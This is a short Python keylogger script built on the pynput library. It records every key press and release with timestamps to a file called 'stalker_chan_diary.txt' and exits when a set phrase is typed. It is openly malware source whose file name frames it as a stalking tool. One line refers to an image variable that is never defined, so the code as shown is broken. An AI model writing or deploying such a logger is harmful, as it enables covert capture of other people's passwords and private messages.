from pynput import keyboard
import sys
#import logging
from datetime import datetime
import winsound
import io
from PIL import Image

#setting up stop mechanism:
kill_switch = 'yamateplease'
alpha_string = ''

class logger:
	def __init__(self,filename,filemode='a'):
		with open(filename,filemode) as f:
			f.write(f'\n\n logging started at {self.now} \n\n')
		self.filename = filename
		self.filemode = filemode

	@property
	def now(self):
		return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

	def info(self,message):
		with open(self.filename,self.filemode) as f:
			f.write(f'{self.now} - INFO - {message}\n')

	def debug(self,message):
		with open(self.filename,self.filemode) as f:
			f.write(f'{self.now} - DEBUG - {message}\n')

logging = logger(filename='stalker_chan_diary.txt', filemode='a')

#logging keylogs
#logging.basicConfig(level= logging.INFO, filename=r'stalker_chan_diary.txt', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logging.debug('This is a debug message')

exit_image = Image.open(io.BytesIO(exit_image))

def on_press(key):
	global alpha_string
	try:
		assert(type(key.char) is str)
		print(f'alphanumeric key {key.char} pressed')
		logging.info(f'alphanumeric key {key.char} pressed')

		if key.char in kill_switch:
			alpha_string = alpha_string + key.char
		else:
			alpha_string = ''

		if alpha_string == kill_switch:
			print("Code stopped by user input pattern")
			logging.debug("Code stopped by user input pattern")
			winsound.Beep(400,400)
			exit_image.show()
			sys.exit()

	except (AttributeError, AssertionError):
		alpha_string = ''
		print(f'special key {key} pressed')
		logging.info(f'special key {key} pressed')

def on_release(key):
	try:
		print(f'alphanumeric key {key.char} released')
		logging.info(f'alphanumeric key {key.char} released')

	except AttributeError:
		print(f'special key {key} released')
		logging.info(f'special key {key} released')

# Collect events until released
print('listening to u...')
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    print("I'm listening..")
    listener.join()
print('Finished!')
